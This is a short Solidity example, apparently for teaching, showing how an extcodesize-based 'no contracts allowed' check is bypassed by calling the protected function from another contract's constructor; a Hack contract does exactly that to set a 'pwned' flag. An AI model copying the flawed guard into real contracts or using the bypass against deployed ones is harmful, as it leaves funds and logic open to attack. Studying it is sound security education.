// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Target {
    function isContract(address account) public view returns (bool) {
        uint size;

        //    here by using the assembly we are checking that the size of code at the given address is zero or not
        // if it is zero then it is a normal address of wallet otherwise it is a contract

        // HACK : -  when we are deploying a contract, it's size is zero at that point
        // we can byPass this check while we are deploying our smart contract
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    bool public pwned = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}

contract Hack {
    constructor(address _target) {
        Target(_target).protected();
    }
}
